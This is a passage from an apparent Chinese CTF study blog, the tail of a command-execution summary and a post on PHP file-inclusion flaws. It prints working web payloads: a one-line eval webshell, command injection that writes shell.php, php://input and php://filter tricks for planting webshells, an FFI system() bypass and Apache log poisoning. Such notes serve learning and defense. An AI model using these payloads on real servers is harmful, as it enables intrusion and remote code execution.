class="php">phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">?c=.+/???/????????[@-[]</span></span><br><span class="line"><span class="php">+:空格的意思，也可以用空格编码%<span class="number">20</span> 空格 + %<span class="number">20</span> 都可以表示空格</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="number">123</span>为<span class="number">1</span>.txt的内容  然后在上传文件内容添加sh命令          </span></span><br><span class="line"><span class="php"><span class="comment">#!/bin/sh</span></span></span><br><span class="line"><span class="php">ls</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">linux命令执行的另外一种方式</span></span><br><span class="line"><span class="php">原理:linux环境下执行命令可以以文件形式存在</span></span><br><span class="line"><span class="php">如aa.txt文件中--&gt;cat /etc/passwd</span></span><br><span class="line"><span class="php">即可./aa.txt执行这个命令</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">linux通配符</span></span><br><span class="line"><span class="php"></span></span><br></pre></td></tr></table></figure>

<p>临时文件上传</p>
<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220226234043869.png" alt="image-20220226234043869"></p>
<p>一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p>
<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。<code>$(())</code>的值是0   如果b=<del>a，那么a+b=-1。若a=0,</del>0=-1</p>
<p>$((~$(())))   ~0=-1</p>
<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p><strong>无参数</strong>的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong></p>
<p><strong>print_r(scandir(‘.’))</strong></p>
<p>可以用来查看当前目录所有文件名</p>
<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
<p>​         <strong>scandir() 函数返回指定目录中的文件和目录的数组</strong></p>
<ul>
<li>localeconv()  函数返回一包含本地数字及货币格式信息的数组。</li>
<li>current()        函数返回数组中的当前元素（单元）,默认取第一个值，</li>
<li>pos() 同 current()  ,是current()的别名</li>
<li>reset()   函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li>
<li>array_reverse()逆转数组函数</li>
<li>next()函数进行下一个值的读取</li>
<li>ord()返回字符串中第一个字符的Ascii值</li>
<li><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124140605804.png" alt="image-20220124140605804"></li>
<li>readgzfile()也可读文件，常用于绕过过滤</li>
<li>dirname() ：返回路径中的目录部分</li>
<li>chdir() ：改变当前工作目录</li>
<li>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</li>
<li>array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li>
<li>show_source() 函数对文件进行语法高亮显示。</li>
<li>highlight_file() 函数对文件进行语法高亮显示。</li>
<li>readfile() 函数读取一个文件，并写入到输出缓冲。</li>
</ul>
<p>​         **localeconv() ** 函数 返回数组的第一项就是 .  (小数点)<img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220124144510476.png" alt="image-20220124144510476"></p>
<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
<p>所以最终我们可以构造如下：查看当前目录所有文件名</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">pos</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">reset</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure>

<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">dirname</span>(<span class="params">getcwd</span>()</span>))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="0x04-综合利用类"><a href="#0x04-综合利用类" class="headerlink" title="0x04 综合利用类"></a>0x04 综合利用类</h2><p>典型拼接写木马</p>
<p>利用拼接执行写一句话木马</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">127.0.0.1 &amp;echo &quot;</span><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&quot; &gt;&gt; shell.php#没过滤空格和典型的关键字时可用</span></span><br><span class="line"><span class="xml">127.0.0.1 | cat 3122542822583.php |base64#即拼接进行base64显示,典型用于直接cat不出来的情况下</span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>



<h3 id="命令执行无回显绕过"><a href="#命令执行无回显绕过" class="headerlink" title="命令执行无回显绕过"></a>命令执行无回显绕过</h3><p><strong>&gt;/dev/null 2&gt;&amp;1</strong>主要意思是不进行回显的意思</p>
<p><strong>1、可以将/dev/null看作”黑洞”. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</strong><br>用处:<br>禁止标准输出.  1 cat $filename &gt;/dev/null  # 文件内容丢失，而不会输出到标准输出.<br>禁止标准错误.   2&gt;/dev/null 这样错误信息[标准错误]就被丢到太平洋去了. </p>
<p><strong>2、1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p>
<p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p>
<p><strong>那么:</strong><br>1&gt;/dev/null 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。<br>2&gt;&amp;1 接着，标准错误输出重定向等同于 标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 </p>
<p>3、/dev/zero文件代表一个永远输出 0的设备文件，使用它作输入可以得到全为空的文件。因此可用来创建新文件和以覆盖的方式清除旧文件。 </p>
<p>下面使用dd命令将从zero设备中创建一个10K大小（bs决定每次读写1024字节，count定义读写次数为10次），但内容全为0的文件。<br>dd if=/dev/zero of=file count=10 bs=1024</p>
<p> shell中可能经常能看到：<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">&gt;/dev/null 2&gt;&amp;1</a> </p>
<p>命令的结果可以通过%&gt;的形式来定义输出</p>
<p>分解这个组合：“&gt;/dev/null 2&gt;&amp;1” 为五部分。</p>
<p>1：&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>2：/dev/null 代表空设备文件<br>3：2&gt; 表示stderr标准错误<br>4：&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>5：1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于 “1&gt;/dev/null”</p>
<p><strong>因此，&gt;<a target="_blank" rel="noopener" href="http://sjolzy.cn/shell-in-the-dev-null-2-gt-amp-1-Detailed.html">/dev/null 2&gt;&amp;1</a> 也可以写成“1&gt; /dev/null 2&gt; &amp;1”</strong></p>
<p>要让命令回显，那么进行命令分隔即可</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;	<span class="regexp">//</span>分号</span><br><span class="line">|	<span class="regexp">//</span>只执行后面那条命令</span><br><span class="line">||	<span class="regexp">//</span>只执行前面那条命令</span><br><span class="line">&amp;	<span class="regexp">//</span>两条命令都会执行</span><br><span class="line">&amp;&amp;	<span class="regexp">//</span>两条命令都会执行</span><br></pre></td></tr></table></figure>

<h2 id="其他姿势："><a href="#其他姿势：" class="headerlink" title="其他姿势："></a>其他姿势：</h2><p>include 无法使用，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
<p>在<strong>PDO</strong>中，我们可以使用三种方式来执行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>，分别是 exec()方法，query方法，以及预处理语句prepare()和execute()方法</p>
<p><img src="/2022/02/26/CTF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/image-20220220163455540.png" alt="image-20220220163455540"></p>
<p>exec()方法返回执行SQL 语句后受影响的行数，其语法格式如下：</p>
<p>参数 satatement 是要执行的SQL语句，该方法返回执行SQL 语句时受影响的行数，通常用于 INSERT，DELETE和UPDATE语句中</p>
<p>query()方法用于返回执行查询后的结果集，该函数的语法格式如下如下：</p>
<p>参数 satatement 是要执行的 SQL语句，它返回的是一个PODStatement对象！</p>
<p>注意:</p>
<p>1、query和exec都可以执行所有的sql语句，只是返回值不同而已。</p>
<p>2、query可以实现所有exec的功能。</p>
<p>3、当把select语句应用到 exec 时，总是返回 0</p>
<p>4、如果要看查询的具体结果，可以通过foreach语句完成循环输出</p>
<p>第三种种方法：预处理语句：prepare()语句和execute()语句</p>
<p>预处理语句包括prepare()和execute()两种方法。首先，通过prepare()方法做查询准备工作，然后通过execute()方法执行查询，并且还可以通过bindParam()方法来绑定参数给execute()方法</p>
<p><strong>php中的“-&gt;”符号</strong>被称为箭头<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符</a>，箭头运算符左侧是获取类的实例，右侧将指定左侧类的方法和属性并进行<strong>调用</strong></p>
<p><strong>FFI</strong></p>
<p>外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 </p>
<p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133809650">https://zhuanlan.zhihu.com/p/133809650</a></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line">readflag是专门用来读flag的。然后访问`/<span class="number">1</span>.txt`即可</span><br></pre></td></tr></table></figure>

<p>system函数：<br>原型：int system(const char * command)；<br>功能：执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名;<br>说明：在windows系统中，system函数直接在控制台调用一个command命令。在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程；</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CJ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Echo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">CTF文件包含漏洞总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-26 22:05:49" itemprop="dateCreated datePublished" datetime="2022-02-26T22:05:49+08:00">2022-02-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-04 16:45:13" itemprop="dateModified" datetime="2022-03-04T16:45:13+08:00">2022-03-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Symbols count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Symbols count in article: </span>
      <span>6.8k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>6 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x01-什么是文件包含漏洞"><a href="#0x01-什么是文件包含漏洞" class="headerlink" title="0x01 什么是文件包含漏洞"></a>0x01 什么是文件包含漏洞</h2><p>通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PHP&spm=1001.2101.3001.7020">PHP</a>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
<h2 id="0x02-文件包含漏洞的环境要求"><a href="#0x02-文件包含漏洞的环境要求" class="headerlink" title="0x02 文件包含漏洞的环境要求"></a>0x02 文件包含漏洞的环境要求</h2><p>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</p>
<p>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</p>
<h2 id="0x03-常见文件包含函数"><a href="#0x03-常见文件包含函数" class="headerlink" title="0x03 常见文件包含函数"></a>0x03 常见文件包含函数</h2><p>php中常见的文件包含函数有以下四种：</p>
<pre><code>include()
require()
include_once()
require_once()
</code></pre>
<p>include与require基本是相同的，除了错误处理方面:</p>
<pre><code>include()，只生成警告（E_WARNING），并且脚本会继续
require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本
include_once()与require_once()，如果文件已包含，则不会包含，其他特性如上
</code></pre>
<h2 id="0x04-PHP伪协议"><a href="#0x04-PHP伪协议" class="headerlink" title="0x04 PHP伪协议"></a>0x04 PHP伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
<p>一、php://input</p>
<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221106381.png" alt="image-20220226221106381"></p>
<p>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>二、php://filter</p>
<p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221326310.png" alt="image-20220226221326310"></p>
<p>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
<h3 id="php-filter的妙用"><a href="#php-filter的妙用" class="headerlink" title="php://filter的妙用"></a>php://filter的妙用</h3><p>XXE中的使用</p>
<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">readfile</span></span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;</span>);</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227215417879.png" alt="image-20220227215417879"></p>
<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-693b1469385893.png"></p>
<p><strong>巧用编码与解码</strong></p>
<p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p>
<p>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p>
<p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
<p>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227220004241.png" alt="image-20220227220004241"></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_2">利用字符串操作方法</a></p>
<p>有的同学说，base64的算法我不懂，上面的方法太复杂了。</p>
<p>其实，除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p>
<p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p>
<p>编写如下测试代码即可查看 php://filter/read=string.strip_tags/resource=php://input 的效果：</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php<span class="symbol">://filter/read=string</span>.strip_tags/resource=php<span class="symbol">://input</span>&#x27;)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-499a1469385895.png" alt="QQ截图20160725010403.png"></p>
<p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p>
<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
<p>最终的数据包如下：</p>
<p><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png" alt="QQ截图20160725011007.png"></p>
<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201607/1c471469385896.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png" alt="QQ截图20160725012639.png"></a></p>
<p>当然，这个方法的条件就是不开启短标签。</p>
<p>三、zip://</p>
<p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
<pre><code>zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
</code></pre>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221548409.png" alt="image-20220226221548409"></p>
<p>四、data://与phar://</p>
<p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221636438.png" alt="image-20220226221636438"></p>
<p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
<ul>
<li>phar://中相对路径和绝对路径都可以使用<br> <img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20190212183933220.png"></li>
</ul>
<p>compress.zlib://   加速读取文件</p>
<p>zlib 是通用的压缩库，提供了一套 in-memory 压缩和解压函数，并能检测解压出来的数据的完整性(integrity)。zlib 也支持读写 gzip (.gz) 格式的文件。</p>
<p>int compress(Bytef *dest, uLongf *destLen, const Bytef *source, uLong sourceLen);</p>
<p>compress函数将 source 缓冲区中的内容压缩到 dest 缓冲区。 sourceLen 表示source 缓冲区的大小(以字节计)。注意函数的第二个参数 destLen 是传址调用。当调用函数时，destLen表示 dest  缓冲区的大小，destLen &gt; (sourceLen + 12)*100.1%。当函数退出后，destLen  表示压缩后缓冲区的实际大小。此时 destLen / sourceLen 正好是压缩率。</p>
<p>compress 若成功，则返回 Z_OK；若没有足够内存，则返回 Z_MEM_ERROR；若输出缓冲区不够大，则返回 Z_BUF_ERROR。</p>
<h2 id="0x05-包含Apache日志文件"><a href="#0x05-包含Apache日志文件" class="headerlink" title="0x05 包含Apache日志文件"></a>0x05 包含Apache日志文件</h2><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p>
<p>利用条件：a、对日志文件可读  b、知道日志文件存储目录</p>
<p>（1）日志的物理存放路径</p>
<p>（2）存在文件包含漏洞</p>
<p>（3）curl命令行url请求工具或者burpsuite代理；（避免url转码的存在）</p>
<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221906093.png" alt="image-20220226221906093"></p>
<p>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>  如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</p>
<p><strong>获取日志存放路径</strong></p>
<p><strong>1、日志默认路径</strong></p>
<p>(1) apache+Linux日志默认路径</p>
<p> /etc/httpd/logs/access_log   或者   /var/log/httpd/access_log</p>
<p>(2) apache+win2003日志默认路径</p>
<p> D:\xampp\apache\logs\access.log</p>
<p> D:\xampp\apache\logs\error.log</p>
<p>(3) IIS6.0+win2003默认日志文件</p>
<p> C:\WINDOWS\system32\Logfiles</p>
<p>(4) IIS7.0+win2003 默认日志文件</p>
<p> %SystemDrive%\inetpub\logs\LogFiles</p>
<p>(5) nginx 日志文件</p>
<p>日志文件在用户安装目录logs目录下，以我的安装路径为例/usr/local/nginx,那我的日志目录就是在/usr/local/nginx/logs里</p>
<p><strong>2</strong>、<strong>web中间件默认配置</strong></p>
<p>(1) apache+linux 默认配置文件</p>
